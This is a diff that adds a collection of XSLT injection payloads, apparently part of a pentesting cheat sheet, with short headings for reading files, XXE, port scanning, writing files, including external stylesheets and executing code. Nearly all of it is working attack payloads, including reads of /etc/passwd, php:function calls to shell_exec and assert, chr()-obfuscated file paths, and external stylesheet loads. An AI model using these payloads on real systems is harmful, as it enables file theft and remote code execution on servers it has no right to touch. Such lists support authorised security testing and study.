@@ -163,3 +163,120 @@ return proc.StandardOutput.ReadToEnd();
   --- END COMMAND OUTPUT ---	
   </xsl:template>
 </xsl:stylesheet>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+        <xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
+        <br />
+    </body>
+</html>
+
+Read files
+Internal - PHP
+
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
+<xsl:template match="/">
+<xsl:value-of select="unparsed-text('/etc/passwd', ‘utf-8')"/>
+</xsl:template>
+</xsl:stylesheet>
+
+Internal - XXE
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+&ext_file;
+</xsl:template>
+</xsl:stylesheet>
+
+Through HTTP
+
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<xsl:value-of select="document('/etc/passwd')"/>
+</xsl:template>
+</xsl:stylesheet>
+
+<!DOCTYPE xsl:stylesheet [
+<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
+<xsl:template match="/">
+&passwd;
+</xsl:template>
+
+Internal (PHP-function)
+
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
+</xsl:template>
+</xsl:stylesheet>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+        <xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
+        <br />
+    </body>
+</html>
+
+Port scan
+
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:value-of select="document('http://example.com:22')"/>
+</xsl:template>
+</xsl:stylesheet>
+
+Write to a file
+XSLT 2.0
+
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:result-document href="local_file.txt">
+<xsl:text>Write Local File</xsl:text>
+</xsl:result-document>
+</xsl:template>
+</xsl:stylesheet>
+
+Xalan-J extension
+
+<xsl:template match="/">
+<redirect:open file="local_file.txt"/>
+<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
+<redirect:close file="loxal_file.txt"/>
+</xsl:template>
+
+Other ways to write files in the PDF
+Include external XSL
+
+<xsl:include href="http://extenal.web/external.xsl"/>
+
+<?xml version="1.0" ?>
+<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
+
+Execute code
+php:function
+
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:value-of select="php:function('shell_exec','sleep 10')" />
+</xsl:template>
+</xsl:stylesheet>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
+<br />
+</body>
+</html>
+	
